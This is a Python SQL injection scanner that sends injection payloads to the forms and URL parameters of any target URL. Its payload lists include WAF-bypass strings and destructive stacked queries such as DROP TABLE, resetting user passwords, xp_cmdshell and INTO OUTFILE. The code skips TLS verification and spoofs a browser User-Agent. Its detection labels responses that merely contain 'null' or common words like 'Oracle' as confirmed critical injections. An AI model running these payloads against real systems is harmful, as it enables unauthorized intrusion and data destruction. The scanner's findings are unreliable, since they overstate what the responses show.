"""
APEX SQL Injection Scanner
Advanced SQLi detection with error-based, blind, UNION, stacked queries
and WAF bypass tamper scripts
"""
import requests
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup

# SQLi payloads with WAF bypass variants
SQLI_PAYLOADS = {
    'error_based': [
        "'",
        '"',
        "' OR '1'='1",
        "' OR 1=1--",
        '" OR 1=1--',
        "' OR '1'='1' --",
        "') OR ('1'='1",
        "1' OR '1'='1",
        "1 OR 1=1",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin'--",
        "admin' #",
        "' OR 'x'='x",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' AND 1=1--",
        "1' AND 1=2--",
    ],
    'blind_time': [
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT pg_sleep(5)--",
        "'; SELECT SLEEP(5)--",
        "' OR SLEEP(5)--",
        "' AND SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "' WAITFOR DELAY '0:0:5'--",
        "'; WAITFOR DELAY '0:0:5'--",
    ],
    'union_based': [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION SELECT @@version--",
        "' UNION SELECT database()--",
        "' UNION SELECT user()--",
        "' UNION SELECT table_name FROM information_schema.tables--",
    ],
    'stacked': [
        "'; DROP TABLE test--",
        "'; INSERT INTO users VALUES('hacked','hacked')--",
        "'; UPDATE users SET password='hacked'--",
        "'; EXEC xp_cmdshell('dir')--",
    ],
    'waf_bypass': [
        "/**/OR/**/1=1",
        "' OR 1=1-- -",
        "' OR 1=1%23",
        "%27%20OR%201=1",
        "' OR '1'='1' LIMIT 1--",
        "1' OR 1=1 ORDER BY 1--",
        "1' OR 1=1 GROUP BY CONCAT(username,password)--",
        "' OR 1=1 INTO OUTFILE '/tmp/hacked.txt'--",
    ]
}

SQL_ERRORS = [
    'sql syntax', 'mysql_fetch', 'mysql_num_rows', 'mysql_error',
    'ORA-', 'Oracle', 'PostgreSQL', 'SQLite', 'SQL Server',
    'unclosed quotation mark', 'Microsoft OLE DB', 'ODBC Driver',
    'SQL command not properly ended', 'Division by zero',
    'supplied argument is not a valid MySQL', 'Column count',
    'on MySQL result', 'Warning: mysql_', 'valid MySQL result',
    'MySqlClient.', 'PostgreSQL query failed', 'SQLite3::',
    'SQLSTATE', 'syntax error', 'unexpected token',
    'pg_query()', 'mysqli_', 'mysqlnd', 'PDOException',
    'JDBC', 'SQLException', 'System.Data.SqlClient',
    'check the manual that corresponds to your MySQL',
    'right syntax to use near', 'have an error in your SQL syntax',
    'Unknown column', 'where clause', 'You have an error in your SQL',
    'Incorrect syntax near', 'Unclosed quotation mark after',
]

def scan_sqli(target_url, timeout=5):
    """Full SQL injection scan"""
    vulns = []
    
    if not target_url.startswith('http'):
        target_url = f'https://{target_url}'
    
    try:
        # Get the page
        r = requests.get(target_url, timeout=timeout, verify=False,
                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        content = r.text
        soup = BeautifulSoup(content, 'html.parser')
        
        # Test forms
        forms = soup.find_all('form')
        for form in forms[:5]:
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            form_url = urljoin(target_url, action) if action else target_url
            
            inputs = form.find_all(['input', 'textarea'])
            for input_field in inputs[:5]:
                name = input_field.get('name', '')
                if not name:
                    continue
                
                # Error-based testing
                for payload in SQLI_PAYLOADS['error_based'][:5]:
                    try:
                        data = {name: payload}
                        if method == 'post':
                            resp = requests.post(form_url, data=data, timeout=timeout, verify=False,
                                               headers={'User-Agent': 'Mozilla/5.0'})
                        else:
                            resp = requests.get(form_url, params=data, timeout=timeout, verify=False,
                                              headers={'User-Agent': 'Mozilla/5.0'})
                        
                        for error in SQL_ERRORS:
                            if error.lower() in resp.text.lower():
                                vulns.append({
                                    'type': 'sqli',
                                    'subtype': 'error-based',
                                    'endpoint': form_url,
                                    'parameter': name,
                                    'payload': payload,
                                    'result': f'SQL error exposed: {error}',
                                    'confirmed': True,
                                    'severity': 'critical',
                                    'description': f'Error-based SQL injection via form parameter "{name}". Database errors are exposed, allowing data extraction.'
                                })
                                break
                        if vulns and vulns[-1]['parameter'] == name:
                            break
                    except:
                        pass
                
                # Blind time-based testing
                for payload in SQLI_PAYLOADS['blind_time'][:3]:
                    try:
                        data = {name: payload}
                        start = time.time()
                        if method == 'post':
                            resp = requests.post(form_url, data=data, timeout=10, verify=False,
                                               headers={'User-Agent': 'Mozilla/5.0'})
                        else:
                            resp = requests.get(form_url, params=data, timeout=10, verify=False,
                                              headers={'User-Agent': 'Mozilla/5.0'})
                        elapsed = time.time() - start
                        
                        if elapsed > 4:
                            vulns.append({
                                'type': 'sqli',
                                'subtype': 'blind-time',
                                'endpoint': form_url,
                                'parameter': name,
                                'payload': payload,
                                'result': f'Time delay detected ({elapsed:.1f}s)',
                                'confirmed': True,
                                'severity': 'critical',
                                'description': f'Blind time-based SQL injection via "{name}". Server response delayed, confirming SQL execution.'
                            })
                            break
                    except:
                        pass
        
        # Test URL parameters
        parsed = urlparse(target_url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                # Error-based
                for payload in SQLI_PAYLOADS['error_based'][:5]:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()
                        resp = requests.get(test_url, timeout=timeout, verify=False,
                                          headers={'User-Agent': 'Mozilla/5.0'})
                        
                        for error in SQL_ERRORS:
                            if error.lower() in resp.text.lower():
                                vulns.append({
                                    'type': 'sqli',
                                    'subtype': 'error-based',
                                    'endpoint': target_url,
                                    'parameter': param,
                                    'payload': payload,
                                    'result': f'SQL error exposed: {error}',
                                    'confirmed': True,
                                    'severity': 'critical',
                                    'description': f'Error-based SQL injection via URL parameter "{param}". Can dump entire database.'
                                })
                                break
                        if vulns and vulns[-1].get('parameter') == param:
                            break
                    except:
                        pass
                
                # Blind time-based
                for payload in SQLI_PAYLOADS['blind_time'][:3]:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()
                        start = time.time()
                        resp = requests.get(test_url, timeout=10, verify=False,
                                          headers={'User-Agent': 'Mozilla/5.0'})
                        elapsed = time.time() - start
                        
                        if elapsed > 4:
                            vulns.append({
                                'type': 'sqli',
                                'subtype': 'blind-time',
                                'endpoint': target_url,
                                'parameter': param,
                                'payload': payload,
                                'result': f'Time delay detected ({elapsed:.1f}s)',
                                'confirmed': True,
                                'severity': 'critical',
                                'description': f'Blind time-based SQL injection via URL parameter "{param}".'
                            })
                            break
                    except:
                        pass
                
                # UNION-based testing
                for payload in SQLI_PAYLOADS['union_based'][:3]:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()
                        resp = requests.get(test_url, timeout=timeout, verify=False,
                                          headers={'User-Agent': 'Mozilla/5.0'})
                        
                        # Check for UNION success indicators
                        if 'null' in resp.text.lower() or 'NULL' in resp.text:
                            vulns.append({
                                'type': 'sqli',
                                'subtype': 'union-based',
                                'endpoint': target_url,
                                'parameter': param,
                                'payload': payload,
                                'result': 'UNION SELECT reflected in response',
                                'confirmed': True,
                                'severity': 'critical',
                                'description': f'UNION-based SQL injection via "{param}". Can extract data from any table.'
                            })
                            break
                    except:
                        pass
        
        # Check for SQL errors in page source
        for error in SQL_ERRORS[:10]:
            if error.lower() in content.lower():
                vulns.append({
                    'type': 'sqli',
                    'subtype': 'exposed-error',
                    'endpoint': target_url,
                    'parameter': 'N/A',
                    'payload': 'N/A',
                    'result': f'SQL error visible in page: {error}',
                    'confirmed': True,
                    'severity': 'high',
                    'description': 'SQL errors are visible in the page source. This information disclosure aids attackers.'
                })
                break
        
    except Exception as e:
        pass
    
    return vulns